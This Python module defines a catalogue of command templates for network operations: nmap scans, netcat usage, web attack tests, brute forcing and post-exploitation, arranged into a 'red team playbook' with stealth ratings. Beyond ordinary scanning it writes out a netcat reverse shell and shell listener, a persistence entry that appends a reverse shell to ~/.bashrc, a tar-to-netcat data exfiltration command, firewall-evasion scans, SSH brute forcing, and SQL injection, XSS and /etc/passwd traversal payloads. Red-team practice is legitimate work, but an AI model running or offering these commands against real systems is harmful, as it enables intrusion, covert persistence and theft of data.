"""
Command Data Structures
Predefined command templates and data for network operations
"""

from typing import Dict, List, Tuple, Any
from dataclasses import dataclass

@dataclass
class CommandTemplate:
    """Command template structure"""
    name: str
    description: str
    command: str
    parameters: List[str]
    examples: List[str]
    category: str
    difficulty: str
    stealth_level: str

class NetworkCommands:
    """Network command definitions and templates"""
    
    def __init__(self):
        self.nmap_commands = self._initialize_nmap_commands()
        self.netcat_commands = self._initialize_netcat_commands()
        self.exploitation_commands = self._initialize_exploitation_commands()
        self.reconnaissance_commands = self._initialize_reconnaissance_commands()
    
    def _initialize_nmap_commands(self) -> Dict[str, Dict[str, CommandTemplate]]:
        """Initialize nmap command templates"""
        return {
            'basic': {
                'simple_scan': CommandTemplate(
                    name="Simple Scan",
                    description="Basic port scan of target",
                    command="nmap {target}",
                    parameters=["target"],
                    examples=["nmap 192.168.1.1", "nmap example.com"],
                    category="basic",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'aggressive_scan': CommandTemplate(
                    name="Aggressive Scan",
                    description="Comprehensive scan with OS detection, version detection, script scanning, and traceroute",
                    command="nmap -A {target}",
                    parameters=["target"],
                    examples=["nmap -A 192.168.1.1", "nmap -A example.com"],
                    category="basic",
                    difficulty="intermediate",
                    stealth_level="low"
                ),
                
                'subnet_scan': CommandTemplate(
                    name="Subnet Scan",
                    description="Scan entire subnet",
                    command="nmap {subnet}",
                    parameters=["subnet"],
                    examples=["nmap 192.168.1.0/24", "nmap 10.0.0.0/16"],
                    category="basic",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'range_scan': CommandTemplate(
                    name="IP Range Scan",
                    description="Scan range of IP addresses",
                    command="nmap {start_ip}-{end_ip}",
                    parameters=["start_ip", "end_ip"],
                    examples=["nmap 192.168.1.1-100", "nmap 10.0.0.1-10.0.0.50"],
                    category="basic",
                    difficulty="beginner",
                    stealth_level="medium"
                )
            },
            
            'discovery': {
                'ping_sweep': CommandTemplate(
                    name="Ping Sweep",
                    description="Ping scan to identify live hosts",
                    command="nmap -sP {target}",
                    parameters=["target"],
                    examples=["nmap -sP 192.168.1.0/24"],
                    category="discovery",
                    difficulty="beginner",
                    stealth_level="high"
                ),
                
                'no_ping_scan': CommandTemplate(
                    name="No Ping Scan",
                    description="Skip ping discovery and scan directly",
                    command="nmap -PN {target}",
                    parameters=["target"],
                    examples=["nmap -PN 192.168.1.1"],
                    category="discovery",
                    difficulty="beginner",
                    stealth_level="high"
                ),
                
                'tcp_syn_ping': CommandTemplate(
                    name="TCP SYN Ping",
                    description="TCP SYN ping discovery",
                    command="nmap -PS{ports} {target}",
                    parameters=["ports", "target"],
                    examples=["nmap -PS22,80,443 192.168.1.1"],
                    category="discovery",
                    difficulty="intermediate",
                    stealth_level="high"
                ),
                
                'udp_ping': CommandTemplate(
                    name="UDP Ping",
                    description="UDP ping discovery",
                    command="nmap -PU{ports} {target}",
                    parameters=["ports", "target"],
                    examples=["nmap -PU53,161 192.168.1.1"],
                    category="discovery",
                    difficulty="intermediate",
                    stealth_level="high"
                )
            },
            
            'port_scanning': {
                'syn_scan': CommandTemplate(
                    name="SYN Stealth Scan",
                    description="TCP SYN stealth scan",
                    command="nmap -sS {target}",
                    parameters=["target"],
                    examples=["nmap -sS 192.168.1.1"],
                    category="port_scanning",
                    difficulty="intermediate",
                    stealth_level="high"
                ),
                
                'connect_scan': CommandTemplate(
                    name="TCP Connect Scan",
                    description="Full TCP connection scan",
                    command="nmap -sT {target}",
                    parameters=["target"],
                    examples=["nmap -sT 192.168.1.1"],
                    category="port_scanning",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'udp_scan': CommandTemplate(
                    name="UDP Scan",
                    description="UDP port scan",
                    command="nmap -sU {target}",
                    parameters=["target"],
                    examples=["nmap -sU 192.168.1.1"],
                    category="port_scanning",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'port_range_scan': CommandTemplate(
                    name="Port Range Scan",
                    description="Scan specific port range",
                    command="nmap -p {port_range} {target}",
                    parameters=["port_range", "target"],
                    examples=["nmap -p 1-1000 192.168.1.1", "nmap -p 80,443,8080 192.168.1.1"],
                    category="port_scanning",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'top_ports_scan': CommandTemplate(
                    name="Top Ports Scan",
                    description="Scan most common ports",
                    command="nmap --top-ports {number} {target}",
                    parameters=["number", "target"],
                    examples=["nmap --top-ports 1000 192.168.1.1"],
                    category="port_scanning",
                    difficulty="beginner",
                    stealth_level="medium"
                )
            },
            
            'version_detection': {
                'service_version': CommandTemplate(
                    name="Service Version Detection",
                    description="Detect service versions",
                    command="nmap -sV {target}",
                    parameters=["target"],
                    examples=["nmap -sV 192.168.1.1"],
                    category="version_detection",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'os_detection': CommandTemplate(
                    name="OS Detection",
                    description="Operating system detection",
                    command="nmap -O {target}",
                    parameters=["target"],
                    examples=["nmap -O 192.168.1.1"],
                    category="version_detection",
                    difficulty="intermediate",
                    stealth_level="low"
                ),
                
                'aggressive_version': CommandTemplate(
                    name="Aggressive Version Detection",
                    description="Aggressive version and OS detection",
                    command="nmap -sV -O --version-intensity 9 {target}",
                    parameters=["target"],
                    examples=["nmap -sV -O --version-intensity 9 192.168.1.1"],
                    category="version_detection",
                    difficulty="advanced",
                    stealth_level="low"
                )
            },
            
            'firewall_evasion': {
                'fragment_packets': CommandTemplate(
                    name="Fragment Packets",
                    description="Fragment packets to evade firewalls",
                    command="nmap -f {target}",
                    parameters=["target"],
                    examples=["nmap -f 192.168.1.1"],
                    category="firewall_evasion",
                    difficulty="advanced",
                    stealth_level="very_high"
                ),
                
                'decoy_scan': CommandTemplate(
                    name="Decoy Scan",
                    description="Use decoy IPs to mask scan source",
                    command="nmap -D {decoys} {target}",
                    parameters=["decoys", "target"],
                    examples=["nmap -D 192.168.1.100,192.168.1.101,ME 192.168.1.1"],
                    category="firewall_evasion",
                    difficulty="advanced",
                    stealth_level="very_high"
                ),
                
                'idle_scan': CommandTemplate(
                    name="Idle Scan",
                    description="Zombie/idle scan using intermediate host",
                    command="nmap -sI {zombie} {target}",
                    parameters=["zombie", "target"],
                    examples=["nmap -sI 192.168.1.200 192.168.1.1"],
                    category="firewall_evasion",
                    difficulty="expert",
                    stealth_level="very_high"
                ),
                
                'source_port': CommandTemplate(
                    name="Source Port Specification",
                    description="Use specific source port",
                    command="nmap --source-port {port} {target}",
                    parameters=["port", "target"],
                    examples=["nmap --source-port 53 192.168.1.1"],
                    category="firewall_evasion",
                    difficulty="intermediate",
                    stealth_level="high"
                )
            },
            
            'nse_scripts': {
                'default_scripts': CommandTemplate(
                    name="Default Scripts",
                    description="Run default NSE scripts",
                    command="nmap -sC {target}",
                    parameters=["target"],
                    examples=["nmap -sC 192.168.1.1"],
                    category="nse_scripts",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'vulnerability_scripts': CommandTemplate(
                    name="Vulnerability Scripts",
                    description="Run vulnerability detection scripts",
                    command="nmap --script vuln {target}",
                    parameters=["target"],
                    examples=["nmap --script vuln 192.168.1.1"],
                    category="nse_scripts",
                    difficulty="intermediate",
                    stealth_level="low"
                ),
                
                'brute_force_scripts': CommandTemplate(
                    name="Brute Force Scripts",
                    description="Run brute force scripts",
                    command="nmap --script brute {target}",
                    parameters=["target"],
                    examples=["nmap --script brute 192.168.1.1"],
                    category="nse_scripts",
                    difficulty="advanced",
                    stealth_level="very_low"
                ),
                
                'discovery_scripts': CommandTemplate(
                    name="Discovery Scripts",
                    description="Run discovery scripts",
                    command="nmap --script discovery {target}",
                    parameters=["target"],
                    examples=["nmap --script discovery 192.168.1.1"],
                    category="nse_scripts",
                    difficulty="beginner",
                    stealth_level="high"
                )
            }
        }
    
    def _initialize_netcat_commands(self) -> Dict[str, Dict[str, CommandTemplate]]:
        """Initialize netcat command templates"""
        return {
            'port_scanning': {
                'single_port': CommandTemplate(
                    name="Single Port Scan",
                    description="Test single port connectivity",
                    command="nc -zv {host} {port}",
                    parameters=["host", "port"],
                    examples=["nc -zv 192.168.1.1 80"],
                    category="port_scanning",
                    difficulty="beginner",
                    stealth_level="high"
                ),
                
                'port_range': CommandTemplate(
                    name="Port Range Scan",
                    description="Scan range of ports",
                    command="nc -zv {host} {start_port}-{end_port}",
                    parameters=["host", "start_port", "end_port"],
                    examples=["nc -zv 192.168.1.1 1-1000"],
                    category="port_scanning",
                    difficulty="beginner",
                    stealth_level="high"
                ),
                
                'udp_scan': CommandTemplate(
                    name="UDP Port Scan",
                    description="UDP port connectivity test",
                    command="nc -zuv {host} {port}",
                    parameters=["host", "port"],
                    examples=["nc -zuv 192.168.1.1 53"],
                    category="port_scanning",
                    difficulty="intermediate",
                    stealth_level="high"
                )
            },
            
            'banner_grabbing': {
                'http_banner': CommandTemplate(
                    name="HTTP Banner Grab",
                    description="Grab HTTP service banner",
                    command="echo 'GET / HTTP/1.0\\r\\n\\r\\n' | nc {host} {port}",
                    parameters=["host", "port"],
                    examples=["echo 'GET / HTTP/1.0\\r\\n\\r\\n' | nc example.com 80"],
                    category="banner_grabbing",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'generic_banner': CommandTemplate(
                    name="Generic Banner Grab",
                    description="Grab service banner with timeout",
                    command="nc -v -n -w1 {host} {port}",
                    parameters=["host", "port"],
                    examples=["nc -v -n -w1 192.168.1.1 22"],
                    category="banner_grabbing",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'smtp_banner': CommandTemplate(
                    name="SMTP Banner Grab",
                    description="Grab SMTP service banner",
                    command="echo 'EHLO test' | nc {host} 25",
                    parameters=["host"],
                    examples=["echo 'EHLO test' | nc mail.example.com 25"],
                    category="banner_grabbing",
                    difficulty="intermediate",
                    stealth_level="medium"
                )
            },
            
            'listeners': {
                'tcp_listener': CommandTemplate(
                    name="TCP Listener",
                    description="Create TCP listener",
                    command="nc -lvp {port}",
                    parameters=["port"],
                    examples=["nc -lvp 4444"],
                    category="listeners",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'udp_listener': CommandTemplate(
                    name="UDP Listener",
                    description="Create UDP listener",
                    command="nc -luvp {port}",
                    parameters=["port"],
                    examples=["nc -luvp 4444"],
                    category="listeners",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'shell_listener': CommandTemplate(
                    name="Shell Listener",
                    description="Create listener with shell execution",
                    command="nc -lvp {port} -e /bin/bash",
                    parameters=["port"],
                    examples=["nc -lvp 4444 -e /bin/bash"],
                    category="listeners",
                    difficulty="advanced",
                    stealth_level="very_low"
                )
            },
            
            'file_transfer': {
                'send_file': CommandTemplate(
                    name="Send File",
                    description="Send file over network",
                    command="nc {host} {port} < {filename}",
                    parameters=["host", "port", "filename"],
                    examples=["nc 192.168.1.100 1234 < file.txt"],
                    category="file_transfer",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'receive_file': CommandTemplate(
                    name="Receive File",
                    description="Receive file over network",
                    command="nc -lvp {port} > {filename}",
                    parameters=["port", "filename"],
                    examples=["nc -lvp 1234 > received_file.txt"],
                    category="file_transfer",
                    difficulty="beginner",
                    stealth_level="medium"
                )
            },
            
            'tunneling': {
                'port_relay': CommandTemplate(
                    name="Port Relay",
                    description="Create port forwarding relay",
                    command="nc -l -p {local_port} -c 'nc {remote_host} {remote_port}'",
                    parameters=["local_port", "remote_host", "remote_port"],
                    examples=["nc -l -p 8080 -c 'nc 192.168.1.100 80'"],
                    category="tunneling",
                    difficulty="advanced",
                    stealth_level="high"
                ),
                
                'reverse_shell': CommandTemplate(
                    name="Reverse Shell",
                    description="Create reverse shell connection",
                    command="nc {host} {port} -e /bin/bash",
                    parameters=["host", "port"],
                    examples=["nc 192.168.1.100 4444 -e /bin/bash"],
                    category="tunneling",
                    difficulty="advanced",
                    stealth_level="very_low"
                )
            }
        }
    
    def _initialize_exploitation_commands(self) -> Dict[str, Dict[str, CommandTemplate]]:
        """Initialize exploitation command templates"""
        return {
            'web_exploitation': {
                'directory_traversal': CommandTemplate(
                    name="Directory Traversal Test",
                    description="Test for directory traversal vulnerabilities",
                    command="curl -k '{url}/../../../etc/passwd'",
                    parameters=["url"],
                    examples=["curl -k 'http://example.com/page.php?file=../../../etc/passwd'"],
                    category="web_exploitation",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'sql_injection_test': CommandTemplate(
                    name="SQL Injection Test",
                    description="Basic SQL injection test",
                    command="curl -k '{url}' -d \"param=' OR '1'='1\"",
                    parameters=["url"],
                    examples=["curl -k 'http://example.com/login.php' -d \"username=' OR '1'='1&password=test\""],
                    category="web_exploitation",
                    difficulty="intermediate",
                    stealth_level="low"
                ),
                
                'xss_test': CommandTemplate(
                    name="XSS Test",
                    description="Cross-site scripting test",
                    command="curl -k '{url}?param=<script>alert(1)</script>'",
                    parameters=["url"],
                    examples=["curl -k 'http://example.com/search.php?q=<script>alert(1)</script>'"],
                    category="web_exploitation",
                    difficulty="beginner",
                    stealth_level="medium"
                )
            },
            
            'network_exploitation': {
                'smb_enumeration': CommandTemplate(
                    name="SMB Enumeration",
                    description="Enumerate SMB shares",
                    command="smbclient -L //{host} -N",
                    parameters=["host"],
                    examples=["smbclient -L //192.168.1.100 -N"],
                    category="network_exploitation",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'ssh_brute_force': CommandTemplate(
                    name="SSH Brute Force",
                    description="SSH password brute force attack",
                    command="hydra -l {username} -P {wordlist} ssh://{host}",
                    parameters=["username", "wordlist", "host"],
                    examples=["hydra -l admin -P passwords.txt ssh://192.168.1.100"],
                    category="network_exploitation",
                    difficulty="advanced",
                    stealth_level="very_low"
                ),
                
                'snmp_enumeration': CommandTemplate(
                    name="SNMP Enumeration",
                    description="SNMP community string enumeration",
                    command="snmpwalk -c {community} -v1 {host}",
                    parameters=["community", "host"],
                    examples=["snmpwalk -c public -v1 192.168.1.1"],
                    category="network_exploitation",
                    difficulty="intermediate",
                    stealth_level="medium"
                )
            },
            
            'post_exploitation': {
                'privilege_escalation': CommandTemplate(
                    name="Linux Privilege Escalation Check",
                    description="Check for privilege escalation opportunities",
                    command="find / -perm -u=s -type f 2>/dev/null",
                    parameters=[],
                    examples=["find / -perm -u=s -type f 2>/dev/null"],
                    category="post_exploitation",
                    difficulty="advanced",
                    stealth_level="high"
                ),
                
                'persistence': CommandTemplate(
                    name="Create Persistence",
                    description="Create persistent access mechanism",
                    command="echo '{command}' >> ~/.bashrc",
                    parameters=["command"],
                    examples=["echo 'nc -e /bin/bash 192.168.1.100 4444' >> ~/.bashrc"],
                    category="post_exploitation",
                    difficulty="advanced",
                    stealth_level="medium"
                ),
                
                'data_exfiltration': CommandTemplate(
                    name="Data Exfiltration",
                    description="Exfiltrate data via network",
                    command="tar czf - {directory} | nc {host} {port}",
                    parameters=["directory", "host", "port"],
                    examples=["tar czf - /home/user/documents | nc 192.168.1.100 1234"],
                    category="post_exploitation",
                    difficulty="advanced",
                    stealth_level="low"
                )
            }
        }
    
    def _initialize_reconnaissance_commands(self) -> Dict[str, Dict[str, CommandTemplate]]:
        """Initialize reconnaissance command templates"""
        return {
            'passive_reconnaissance': {
                'whois_lookup': CommandTemplate(
                    name="WHOIS Lookup",
                    description="Perform WHOIS domain lookup",
                    command="whois {domain}",
                    parameters=["domain"],
                    examples=["whois example.com"],
                    category="passive_reconnaissance",
                    difficulty="beginner",
                    stealth_level="very_high"
                ),
                
                'dns_enumeration': CommandTemplate(
                    name="DNS Enumeration",
                    description="Comprehensive DNS enumeration",
                    command="dig {domain} ANY",
                    parameters=["domain"],
                    examples=["dig example.com ANY"],
                    category="passive_reconnaissance",
                    difficulty="beginner",
                    stealth_level="very_high"
                ),
                
                'subdomain_enumeration': CommandTemplate(
                    name="Subdomain Enumeration",
                    description="Enumerate subdomains",
                    command="dig @8.8.8.8 {subdomain}.{domain}",
                    parameters=["subdomain", "domain"],
                    examples=["dig @8.8.8.8 www.example.com"],
                    category="passive_reconnaissance",
                    difficulty="intermediate",
                    stealth_level="very_high"
                )
            },
            
            'active_reconnaissance': {
                'traceroute': CommandTemplate(
                    name="Traceroute",
                    description="Trace route to target",
                    command="traceroute {target}",
                    parameters=["target"],
                    examples=["traceroute 8.8.8.8"],
                    category="active_reconnaissance",
                    difficulty="beginner",
                    stealth_level="medium"
                ),
                
                'ping_sweep': CommandTemplate(
                    name="Ping Sweep",
                    description="Ping sweep of network range",
                    command="for i in {{1..254}}; do ping -c 1 {network_base}.$i; done",
                    parameters=["network_base"],
                    examples=["for i in {1..254}; do ping -c 1 192.168.1.$i; done"],
                    category="active_reconnaissance",
                    difficulty="intermediate",
                    stealth_level="medium"
                ),
                
                'arp_scan': CommandTemplate(
                    name="ARP Scan",
                    description="ARP discovery scan",
                    command="arp-scan {network}",
                    parameters=["network"],
                    examples=["arp-scan 192.168.1.0/24"],
                    category="active_reconnaissance",
                    difficulty="beginner",
                    stealth_level="high"
                )
            }
        }
    
    def get_command_by_name(self, category: str, subcategory: str, command_name: str) -> CommandTemplate:
        """Get specific command template"""
        commands_dict = getattr(self, f"{category}_commands", {})
        return commands_dict.get(subcategory, {}).get(command_name)
    
    def get_commands_by_category(self, category: str) -> Dict[str, Dict[str, CommandTemplate]]:
        """Get all commands in a category"""
        return getattr(self, f"{category}_commands", {})
    
    def get_commands_by_difficulty(self, difficulty: str) -> List[CommandTemplate]:
        """Get commands by difficulty level"""
        commands = []
        
        for category_name in ['nmap', 'netcat', 'exploitation', 'reconnaissance']:
            category_commands = getattr(self, f"{category_name}_commands", {})
            
            for subcategory in category_commands.values():
                for command in subcategory.values():
                    if command.difficulty == difficulty:
                        commands.append(command)
        
        return commands
    
    def get_commands_by_stealth_level(self, stealth_level: str) -> List[CommandTemplate]:
        """Get commands by stealth level"""
        commands = []
        
        for category_name in ['nmap', 'netcat', 'exploitation', 'reconnaissance']:
            category_commands = getattr(self, f"{category_name}_commands", {})
            
            for subcategory in category_commands.values():
                for command in subcategory.values():
                    if command.stealth_level == stealth_level:
                        commands.append(command)
        
        return commands
    
    def search_commands(self, query: str) -> List[CommandTemplate]:
        """Search commands by query string"""
        query_lower = query.lower()
        matching_commands = []
        
        for category_name in ['nmap', 'netcat', 'exploitation', 'reconnaissance']:
            category_commands = getattr(self, f"{category_name}_commands", {})
            
            for subcategory in category_commands.values():
                for command in subcategory.values():
                    if (query_lower in command.name.lower() or 
                        query_lower in command.description.lower() or
                        query_lower in command.command.lower()):
                        matching_commands.append(command)
        
        return matching_commands
    
    def get_all_categories(self) -> List[str]:
        """Get all available command categories"""
        return ['nmap', 'netcat', 'exploitation', 'reconnaissance']
    
    def get_command_statistics(self) -> Dict[str, Any]:
        """Get statistics about available commands"""
        stats = {
            'total_commands': 0,
            'by_category': {},
            'by_difficulty': {},
            'by_stealth_level': {}
        }
        
        for category_name in ['nmap', 'netcat', 'exploitation', 'reconnaissance']:
            category_commands = getattr(self, f"{category_name}_commands", {})
            category_count = sum(len(subcategory) for subcategory in category_commands.values())
            
            stats['by_category'][category_name] = category_count
            stats['total_commands'] += category_count
            
            # Count by difficulty and stealth level
            for subcategory in category_commands.values():
                for command in subcategory.values():
                    difficulty = command.difficulty
                    stealth = command.stealth_level
                    
                    stats['by_difficulty'][difficulty] = stats['by_difficulty'].get(difficulty, 0) + 1
                    stats['by_stealth_level'][stealth] = stats['by_stealth_level'].get(stealth, 0) + 1
        
        return stats
    
    def validate_command_parameters(self, command: CommandTemplate, parameters: Dict[str, str]) -> Dict[str, str]:
        """Validate command parameters"""
        errors = {}
        
        # Check all required parameters are provided
        for param in command.parameters:
            if param not in parameters or not parameters[param]:
                errors[param] = f"Parameter '{param}' is required"
        
        # Validate specific parameter types
        for param, value in parameters.items():
            if param in ['port', 'start_port', 'end_port']:
                try:
                    port_num = int(value)
                    if not (1 <= port_num <= 65535):
                        errors[param] = "Port must be between 1 and 65535"
                except ValueError:
                    errors[param] = "Port must be a number"
            
            elif param in ['host', 'target']:
                if not self._validate_host(value):
                    errors[param] = "Invalid hostname or IP address"
            
            elif param == 'network':
                if not self._validate_network(value):
                    errors[param] = "Invalid network specification"
        
        return errors
    
    def _validate_host(self, host: str) -> bool:
        """Validate hostname or IP address"""
        import re
        
        # Simple IP address validation
        ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(ip_pattern, host):
            parts = host.split('.')
            return all(0 <= int(part) <= 255 for part in parts)
        
        # Simple hostname validation
        hostname_pattern = r'^[a-zA-Z0-9.-]+$'
        return re.match(hostname_pattern, host) is not None
    
    def _validate_network(self, network: str) -> bool:
        """Validate network specification (CIDR notation)"""
        import re
        
        cidr_pattern = r'^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$'
        if re.match(cidr_pattern, network):
            ip_part, mask_part = network.split('/')
            mask = int(mask_part)
            
            if not (0 <= mask <= 32):
                return False
            
            parts = ip_part.split('.')
            return all(0 <= int(part) <= 255 for part in parts)
        
        return False
    
    def format_command(self, command: CommandTemplate, parameters: Dict[str, str]) -> str:
        """Format command with provided parameters"""
        try:
            return command.command.format(**parameters)
        except KeyError as e:
            raise ValueError(f"Missing parameter: {e}")
    
    def get_red_team_playbook(self) -> Dict[str, List[str]]:
        """Get red team operation playbook"""
        return {
            'reconnaissance': [
                'passive_reconnaissance.whois_lookup',
                'passive_reconnaissance.dns_enumeration', 
                'passive_reconnaissance.subdomain_enumeration',
                'active_reconnaissance.ping_sweep',
                'active_reconnaissance.arp_scan'
            ],
            
            'scanning': [
                'nmap.discovery.ping_sweep',
                'nmap.basic.simple_scan',
                'nmap.port_scanning.syn_scan',
                'nmap.version_detection.service_version',
                'nmap.version_detection.os_detection'
            ],
            
            'enumeration': [
                'netcat.banner_grabbing.generic_banner',
                'netcat.banner_grabbing.http_banner',
                'exploitation.network_exploitation.smb_enumeration',
                'exploitation.network_exploitation.snmp_enumeration'
            ],
            
            'exploitation': [
                'exploitation.web_exploitation.sql_injection_test',
                'exploitation.web_exploitation.xss_test',
                'exploitation.network_exploitation.ssh_brute_force'
            ],
            
            'post_exploitation': [
                'exploitation.post_exploitation.privilege_escalation',
                'exploitation.post_exploitation.persistence',
                'exploitation.post_exploitation.data_exfiltration'
            ]
        }
